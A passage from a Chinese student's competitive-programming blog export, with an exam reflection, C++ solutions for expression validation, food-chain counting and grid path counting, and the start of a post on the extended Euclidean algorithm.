class="number">1</span>]<span class="number">-1</span>)/<span class="number">2</span>*DP[i+<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;DP[<span class="number">1</span>][<span class="number">1</span>]+DP[<span class="number">1</span>][<span class="number">0</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>T3不会写就不写了QAQ</p>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>考试总结</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>10-17考试总结</title>
    <url>/2017/10/17/c21d5288a5f9/</url>
    <content><![CDATA[<h1 id="考试总结"><a href="#考试总结" class="headerlink" title="考试总结"></a>考试总结</h1><blockquote>
<p>今天焦老师让我们写总结，我决定开始写总结，以前除了大型的考试意外都没有写过，以后怕不是要天天写了……</p>
</blockquote>
<p>这次考试……emmmmmm 先看第一次测评的成绩：</p>
<p><img src="https://xorex.space/image/065.PNG"></p>
<p>然后第一题谜之爆炸，第三题丢了一个点，还好还好没有炸的太狠……</p>
<ul>
<li><p>这次考试过程是非常爽的，感觉节奏不错，首先先看第一题，然后花了一个半小时的时间写完了第一题，用的时间有些长了，其实应该控制在一个小时之内，但是这个第一题有些复杂……真的是不好写。以后尽量控制在一个小时以内。</p>
</li>
<li><p>写完第一题之后，开始看第二题，虽说是省选题，但是是比较简单的，问了帆神Map的使用方法，构建一个Topsort就能AC了，然后造了几个大数据，跑了跑没有问题。</p>
</li>
<li><p>写完前两题之后还剩下一个小时，看是看第三题，一眼秒暴力。想到原来黄山学长讲过怎么写，但是需要求组合数，虽然Century告诉了我组合数的公式，但是并不会求，就开始写暴力，复杂度O(n^2).二十分钟写完加调试。检查了一遍之后去吃饭了。</p>
</li>
</ul>
<p>这次考试期望成绩是100+100+30，实际成绩是30+100+20。实力爆炸。</p>
<ul>
<li><p>T1的爆炸: <img src="https://xorex.space/image/068.PNG"></p>
</li>
<li><p>T2的爆炸：<br><img src="https://xorex.space/image/067.PNG"></p>
</li>
<li><p>T3的爆炸：<br><img src="https://xorex.space/image/069.PNG"></p>
</li>
</ul>
<p>爆炸之后大家修改过后的成绩：</p>
<p><img src="https://xorex.space/image/066.PNG"></p>
<p>感觉以后写题的时候，需要注意两点，一点是把握好时间，T1尽量在一个小时内写完，而且要保证T1不会被炸掉。其次是暴力分数有可能不能拿全，要思考完整。</p>
<p>需要补充的知识点： 字符串哈希，乘法逆元；</p>
<p>勉为其难的写三篇题解吧……</p>
<h1 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>同学们需要先判 断给出的表达式是否合法。现在你的任务就是完成这个工作。<br>在本题中，我们对合法表达式定义如下：</p>
<ol>
<li>任何连续（至少 1 个）数字是合法表达式；</li>
<li>若 x 是合法表达式，则(x)也是合法表达式；</li>
<li>若 x 和 y 是合法表达式，则 x+y、x-y、x*y、x/y 都是合法表达式；</li>
<li>若 x 是合法表达式，则在 x 前后添加任意数量的空白符也是合法表达式。 现在给你若干个表达式，请你判断这些表达式是否是合法的。</li>
</ol>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第 1 行为一个正整数 n，表示表达式个数； 接下来 n 行，每行一个字符串，表示给定的表达式。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>共 n 行，若第 i 个表达式是合法的，就在第 i 行输出”Yes”（不含引号，下同），否则输出”No”。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>题解没有什么好说的，就是使用while循环，然后每次寻找可以化为合法状态的字符串，把他们变成’1’，然后不停地合并为’1’，如果这次循环有改变字符串，那么久继续循环，如果没有改变，那么就结束循环。</p>
</li>
<li><p>判断最后的循环，如果里面只有两个元素，s1[0]=1和s1[1]=0; (这里字符串不知道为什么后面一定会有一个0)，输出”Yes”即可，否则输出”No”;</p>
</li>
<li><p>需要注意的是把合法的化为’1’的过程的时候，有可能吧两个合法的区域化为一个，但其实他们是分开的，比如 “23333 66666” ，就会变成: 1 1 –&gt; 1.那么只需要增加判断就行了，”()”也是同理。我就是这里炸掉的。</p>
</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,Len,Number,ID;</span><br><span class="line"><span class="built_in">string</span> s1,s2;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">bool</span> Flag[<span class="number">200</span>],Now;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Work</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Number=<span class="literal">false</span>; Now=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isdigit</span>(s1[i]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">isdigit</span>(s1[i])) i++;</span><br><span class="line">            s2+=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s2+=s1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    s1=s2; s2.clear();</span><br><span class="line">    Len=s1.size();</span><br><span class="line">    <span class="keyword">while</span>(!Now)</span><br><span class="line">    &#123;</span><br><span class="line">        Now=<span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">memset</span>(Flag,<span class="literal">false</span>,<span class="keyword">sizeof</span>(Flag));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s1[i]==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Flag[i]=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27;)&#x27;</span>&amp;&amp;s1[i<span class="number">-1</span>]==<span class="string">&#x27;(&#x27;</span>&amp;&amp;s1[i+<span class="number">2</span>]!=<span class="string">&#x27;1&#x27;</span>&amp;&amp;s1[i<span class="number">-2</span>]!=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    Flag[i<span class="number">-1</span>]=<span class="literal">true</span>;</span><br><span class="line">                    Flag[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">                    Now=<span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s1[i<span class="number">-1</span>]==<span class="string">&#x27; &#x27;</span>&amp;&amp;s1[i<span class="number">-2</span>]!=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ID=i<span class="number">-1</span>;</span><br><span class="line">                    Now=<span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">while</span>(s1[ID]==<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Flag[ID]=<span class="literal">true</span>;</span><br><span class="line">                        ID--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27; &#x27;</span>&amp;&amp;s1[i+<span class="number">2</span>]!=<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ID=i+<span class="number">1</span>;</span><br><span class="line">                    Now=<span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">while</span>(s1[ID]==<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Flag[ID]=<span class="literal">true</span>;</span><br><span class="line">                        ID++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(s1[i+<span class="number">2</span>]==<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Now=<span class="literal">false</span>;</span><br><span class="line">                        Flag[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">                        Flag[i+<span class="number">2</span>]=<span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Now=<span class="literal">false</span>;</span><br><span class="line">                        Flag[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">                        Flag[i+<span class="number">2</span>]=<span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Now=<span class="literal">false</span>;</span><br><span class="line">                        Flag[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">                        Flag[i+<span class="number">2</span>]=<span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(s1[i+<span class="number">1</span>]==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Now=<span class="literal">false</span>;</span><br><span class="line">                        Flag[i+<span class="number">1</span>]=<span class="literal">true</span>;</span><br><span class="line">                        Flag[i+<span class="number">2</span>]=<span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(Flag[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">while</span>(Flag[i]) i++;</span><br><span class="line">                s2+=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            s2+=s1[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s1=s2; s2.clear();</span><br><span class="line">        Len=s1.size();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Len==<span class="number">2</span>&amp;&amp;s1[<span class="number">0</span>]==<span class="string">&#x27;1&#x27;</span>&amp;&amp;s1[<span class="number">1</span>]==<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;expr.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;expr.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>,&amp;a);</span><br><span class="line">        s1=a;</span><br><span class="line">        Len=s1.size();</span><br><span class="line">        Work();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="食物链"><a href="#食物链" class="headerlink" title="食物链"></a>食物链</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>某研究小组经过长期的调查研究，在此地区发现了 n 个物种，并找到了它们之间 的m对捕食关系，由于物种众多，捕食关系复杂，他们希望你尽快地计算出食物链条数，以便下一步的研究工作。</p>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第 1 行是正整数m，接下来m行有两个字符串A和B，分别代表对应的物种名称，描述了一对捕食关系A→B，表示A被B捕食（能量从A流动到B）。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>仅一行，一个非负整数，为食物链条数对 1000000007 取模的值</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题比较简单，我们需要使用Map或者字符串哈希来吧每一个字符串和一个数组一一映射，然后构建一个图。</p>
<p>然后进行拓扑排序，在拓扑排序的过程中，DP转移能量。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=Link[x];i;i=a[i].Next)</span><br><span class="line">F[a[i].Point]+=F[i];</span><br></pre></td></tr></table></figure>
<p>然后如果这个点被加入队列并且这个点的初度为零，那么这个一定是F[i]条食物链的最顶端。我们让ans+=F[i]%Mod;就可以了。</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mod 1000000007</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Next;</span><br><span class="line">    <span class="keyword">int</span> Point;</span><br><span class="line">&#125;a[<span class="number">4000000</span>];</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;MapStr;</span><br><span class="line"><span class="built_in">string</span> s1;</span><br><span class="line"><span class="keyword">int</span> n,Number,len,Min,head,tail;</span><br><span class="line"><span class="keyword">int</span> First,Second,Link[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> F[<span class="number">200000</span>],ans;</span><br><span class="line"><span class="keyword">int</span> Out[<span class="number">200000</span>],Queue[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">int</span> In[<span class="number">200000</span>];</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">20000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[++len].Point=y;</span><br><span class="line">    a[len].Next=Link[x];</span><br><span class="line">    Link[x]=len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TopSort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Number;i++)</span><br><span class="line">    <span class="keyword">if</span>(!Out[i])</span><br><span class="line">    &#123;</span><br><span class="line">        F[i]=<span class="number">1</span>;</span><br><span class="line">        Queue[++tail]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    Min=tail;</span><br><span class="line">    <span class="keyword">while</span>(++head&lt;=tail)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> Flag=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> This=Queue[head];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=Link[This];i;i=a[i].Next)</span><br><span class="line">        &#123;</span><br><span class="line">            Flag=<span class="literal">true</span>;</span><br><span class="line">            F[a[i].Point]+=F[This];</span><br><span class="line">            F[a[i].Point]%=Mod;</span><br><span class="line">            Out[a[i].Point]--;</span><br><span class="line">            <span class="keyword">if</span>(!Out[a[i].Point])</span><br><span class="line">            Queue[++tail]=a[i].Point;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!Flag&amp;&amp;!In[This])</span><br><span class="line">        ans=(ans+F[This])%Mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans%Mod&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;chain.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;chain.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c); s1=c;</span><br><span class="line">        it=MapStr.find(s1);</span><br><span class="line">        <span class="keyword">if</span>(it==MapStr.end())</span><br><span class="line">        &#123;</span><br><span class="line">            MapStr[s1]=++Number;</span><br><span class="line">            First=Number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> First=MapStr[s1];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c); s1=c;</span><br><span class="line">        it=MapStr.find(s1);</span><br><span class="line">        <span class="keyword">if</span>(it==MapStr.end())</span><br><span class="line">        &#123;</span><br><span class="line">            MapStr[s1]=++Number;</span><br><span class="line">            Second=Number;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> Second=MapStr[s1];</span><br><span class="line">        init(First,Second);</span><br><span class="line">        Out[Second]++;</span><br><span class="line">        In[First]++;</span><br><span class="line">    &#125;</span><br><span class="line">    TopSort();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>周三下午是模电实验课，xy 正打算从宿舍(0,0)去实验楼(n,m)上课，然而他突 然发现，由于暴雨的缘故，有 k 个路口(x,y)已经被水淹没（不知所措），根本过不了人。</p>
</blockquote>
<p>xy 行走的路线很特别，必须满足:</p>
<ol>
<li>一定平行于坐标轴；</li>
<li>只能在横纵坐标都 是整数的点改变方向；</li>
<li>行走过程中横坐标和纵坐标始终不减小。</li>
</ol>
<p>现在有 xy 想知道有多少条满足条件的路线可以避开被淹没的路口到达实验<br>楼。</p>
<h2 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第1行是两个非负整数 n ，m，k表示实验楼的坐标和有 k 个路口被淹没。</li>
<li>接下来 k 行，每行有两个非负整数 x 和 y，表示(x, y)这个路口已被淹没</li>
</ol>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>仅一行，一个非负整数，为满足条件的路线数对 1000000007 取模的值。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>这道题正解不会写，暴力倒是简单，直接DP，设置状态为F[i][j]为到达(i,j)这个点的所有方案数，因为只有下面和左边两种情况到达自己，所以状态转移，如果i不为零F[i][j]+=F[i-1][j]，如果j不为零F[i][j]+=F[i][j-1]，如果是障碍点直接跳过。</p>
</li>
<li><p>注意模数的问题，和开longlong。</p>
</li>
</ul>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mod 1000000007</span></span><br><span class="line"><span class="keyword">int</span> n,m,k,x,y;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> F[<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">bool</span> a[<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    freopen(<span class="string">&quot;path.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    freopen(<span class="string">&quot;path.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">    n=Read(); m=Read(); k=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=k;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Read();</span><br><span class="line">        y=Read();</span><br><span class="line">        a[x][y]=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i][j]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(!i&amp;&amp;!j) F[i][j]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(i) F[i][j]+=F[i<span class="number">-1</span>][j];</span><br><span class="line">        <span class="keyword">if</span>(j) F[i][j]+=F[i][j<span class="number">-1</span>];</span><br><span class="line">        F[i][j]%=Mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;F[n][m]%Mod&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>考试总结</tag>
        <tag>题解</tag>
      </tags>
  </entry>
  <entry>
    <title>扩展欧几里德</title>
    <url>/2017/10/15/c797e2d6885a/</url>
    <content><![CDATA[<h1 id="扩展欧几里德算法"><a href="#扩展欧几里德算法" class="headerlink" title="扩展欧几里德算法"></a>扩展欧几里德算法</h1><h2 id="关于不定方程ax-by-c"><a href="#关于不定方程ax-by-c" class="headerlink" title="关于不定方程ax+by=c"></a>关于不定方程ax+by=c</h2><blockquote>
<p>扩展欧几里德算法其实就是用来求出一组关于ax+by=c的解，复杂度比较稳定，是建立在欧几里德算法上面进行计算的。</p>
</blockquote>
<p>首先需要考虑一下这个不定方程是否有解判断的方法就是：对于一个方程ax+by=c来说，如果 c%GCD(a,b)!=0 那么这个方程就是无解的。其实扩展欧几里德算法解出来的就是丢番图方程的解（好像是丢番图方程）。</p>
<p>首先我们需要看一下这个不定方程是否有解，如果有解的话，就进行计算，很显然的，如果b=0的时候，那么ax=c，那么x一定等于c/a。此时x=c/a,y=0;</p>
<p>然后，然后我们可以列出来两个方程：</p>
<ol>
<li>a*x1+b*y1=GCD(a,b);</li>
<li>b*x2+(a%b)*y2=GCD(b,a%b);</li>
</ol>
<p>然后根据欧几里德算法：GCD(a,b)=GCD(b,a%b);</p>
<p>所以就可以得到：a*x1+b*y1=b*x2+a%b*y2;</p>
<p>然后解得: x1=y2  y1=x2-a/b*y2;</p>
<p>然后我们就可以利用GCD的迭代解出来不定方程ax+by=c的一组解！</p>
<p>注意这里是一组解！！！！！！</p>
<p>但是你需要求出来其他解（比如大于零的最小解）</p>
<p>你就需要明白一个定理，也就是如果(x,y)是不定方程的一组解，那么(x+b/a,y-a/b)<br>也同样是一组解，然后我们就可以愉快的寻找其他解了……</p>
<p>比如大于零的最小x的解：(x%(LCM/a)+LCM/a)%LCM/a;原理和上面的(x+b/a,y-a/b)是一样的。但是(LCM/a)是满足x为整数的最小值。</p>
<ul>
<li>最后我们来看一道神奇的题目：</li>
</ul>
<h1 id="青蛙的约会"><a href="#青蛙的约会" class="headerlink" title="青蛙的约会"></a>青蛙的约会</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p>我们把这两只青蛙分别叫做青蛙A和青蛙B，并且规定纬度线上东经0度处为原点，由东往西为正方向，单位长度1米，这样我们就得到了一条首尾相接的数轴。设青蛙A的出发点坐标是x，青蛙B的出发点坐标是y。青蛙A一次能跳n米，青蛙B一次能跳m米，两只青蛙跳一次所花费的时间相同。纬度线总长L米。现在要你求出它们跳了几次以后才会碰面。</p>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
